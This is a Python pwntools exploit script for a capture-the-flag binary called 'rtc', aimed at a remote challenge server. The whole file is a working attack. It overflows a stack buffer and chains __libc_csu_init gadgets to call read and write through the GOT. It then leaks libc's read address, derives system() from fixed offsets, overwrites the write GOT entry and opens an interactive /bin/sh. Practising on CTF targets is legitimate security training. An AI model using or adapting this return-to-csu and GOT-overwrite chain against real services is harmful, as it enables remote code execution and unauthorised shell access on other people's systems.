# wget https://ctf.j0n9hyun.xyz/files/b52804013a54d1be34ebe362bd31f67d/rtc.zip

from pwn import *
import time
import sys

def csu_call(func_addr, args):
	csu_1 = 0x004006ba	# rbx, rbp, r12, r13, r14, r15
	csu_2 = 0x004006a0	# rdx <- r13, rsi <- r14, edi <- r15

	payload = p64(csu_1)
	payload += p64(0x0)		# rbx
	payload += p64(0x1)		# rbp
	payload += p64(func_addr)		# r12
	payload += p64(args[2])	# r13
	payload += p64(args[1])	# r14
	payload += p64(args[0])	# r15
	payload += p64(csu_2)

	return payload

p = remote("ctf.j0n9hyun.xyz",3025)
#p = process("./rtc")
e = ELF('./rtc')
bss = 0x601050
buff_size = 0x48	# include rbp
ret = 0x400491

input('attach gdb')

print(p.recvline().decode())

payload = b'a'*buff_size
#payload += p64(ret)
payload += csu_call(e.got['read'], [0, bss, 9])
payload += csu_call(e.got['write'], [1, e.got['read'], 8])
payload += csu_call(e.got['read'], [0, e.got['write'], 8])
payload += csu_call(e.got['write'], [bss, 0, 0])
p.sendline(payload)
time.sleep(0.2)
p.sendline(b'/bin/sh\x00')
time.sleep(0.2)

read_addr = unpack(p.recv(),'all',endian='little')
#system_addr = read_addr-0xbbd20	# for local
system_addr = read_addr-0xb1ec0	# for remote
print('read address: ', hex(read_addr))
p.sendline(p64(system_addr))

p.interactive()
